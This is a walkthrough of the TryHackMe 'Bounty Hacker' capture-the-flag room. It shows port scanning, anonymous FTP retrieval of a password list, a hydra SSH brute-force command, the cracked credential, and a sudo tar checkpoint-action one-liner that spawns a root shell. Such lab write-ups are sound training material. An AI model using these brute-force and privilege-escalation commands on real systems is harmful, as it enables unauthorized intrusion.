---
title: TryHackMe Bounty Hacker [CHALLENGE]
date: 2024-03-11 00:00:00 +0800
categories: [TryHackMe, Challenge]
tags: [walkthough,write-ups]     # TAG names should always be lowercase
image:
    path: https://tryhackme-images.s3.amazonaws.com/room-icons/9ad38a2cc31d6ae0030c888aca7fe646.jpeg
---

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

## **Reconnaissance**
Initially do the Nmap scan.
```bash
nmap -sC -sV -p- <TARGET_IP> --open
```
`--open`: Scans only the open ports and reduces the time it takes to complete the nmap scan.


```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 05:41 EDT
Nmap scan report for 10.10.72.181
Host is up (0.32s latency).
Not shown: 56523 filtered tcp ports (no-response), 9009 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.50.82
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 271.50 seconds
```

## **Insights**
---
OS: Ubuntu

- 80 → HTTP
    - Apache httpd 2.4.18 ((Ubuntu)

- 21 → FTP
    - Running vsftpd 3.0.3
    - Allowed anonymous login
    - There are 2 plaintext exposed that looks like a list of passwords and letter containing a username lin

- 22 → SSH
    - Confirmed that lin is legitimate username and locks.txt is a list of possible passwords.
    - login: lin   password: RedDr4gonSynd1cat3

## **Enumeration**
---
### 80 HTTP
Let us see what the webpage looks like.

![Desktop View](/assets/images/bounty-hacker/front-page.png){: width="972" height="589" }

Let us try scanning for other directories using gobuster. We also can’t do pretty much here.

```bash
gobuster dir -u http://10.10.72.181 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30
```
```text
=========================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.72.181/images/]
/server-status        (Status: 403) [Size: 277]
```

It looks like we have a redirect page. We can inspect that and look for more information

![Desktop View](/assets/images/bounty-hacker/images-dir.png){: width="972" height="589" }

Nothing looks interesting.

Since we know that port 21 is open, why don't we try and access the FTP anonymously.


### 21 FTP
```bash
ftp <IP>
```
![Desktop View](/assets/images/bounty-hacker/ftp-anon.png){: width="972" height="589" }

Remember that you can do directory listing similar to linux and it is a best practice to use `-a` flag for hidden files

```bash
ls -la
```
![Desktop View](/assets/images/bounty-hacker/list.png){: width="972" height="589" }

There are two interesting files. Let's get that

```bash
get <FILENAME>
```

From your attacking machine, look into your working directory and and you will see these two files that you got from the FTP earlier.


**locks.txt**

```text
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

**task.txt**

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```




## **Gaining an Initial Foothold**

There is a name who wrote the task.txt which can be username. We also have locks.txt that looks like a list of passwords. Let's hail **hydra**

```bash
hydra -l lin -P locks.txt -t 32 10.10.72.181 ssh
```
![Desktop View](/assets/images/bounty-hacker/hydra.png){: width="972" height="589" }

Let us try connecting via SSH using our newlyfound credentials!

```bash
ssh lin@10.10.72.181
```
![Desktop View](/assets/images/bounty-hacker/bling.png){: width="972" height="589" }

## **Privilege Escalation**

I initially checked `sudo -l` command to list the permissions granted to the current user in the sudoers file.

![Desktop View](/assets/images/bounty-hacker/tar.png){: width="972" height="589" }

The `tar` command, primarily used for archiving files, has the capability to invoke shell commands. This feature can be abused to gain root access when a user is permitted to run `tar` as root without requiring a password.

We can use [gtfobin](https://gtfobins.github.io/gtfobins/vim/#sudo) for privilege escalation.

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
`sudo`: Executes the following command with superuser (root) privileges.


`tar -cf /dev/null /dev/null`: Attempts to create (`c`) an archive file with `tar`, specifying `/dev/null` as both the archive file location and the file to be archived. Essentially, this part of the command does nothing meaningful since `/dev/null` is a special file that discards all data written to it.


`-checkpoint=1`: This option tells `tar` to perform a checkpoint action after every 1 record processed. Since `tar` isn't actually processing any real data here (both input and output are `/dev/null`), the checkpoint essentially triggers immediately.


`-checkpoint-action=exec=/bin/sh`: This option specifies the action `tar` should take when it reaches a checkpoint. In this case, it executes `/bin/sh`, a command shell interpreter. Because the entire command is run with `sudo`, `/bin/sh` is executed with root privileges.

> Do not forget to find the FLAGS
{: .prompt-danger }

![Desktop View](/assets/images/bounty-hacker/pwned.png){: width="972" height="589" }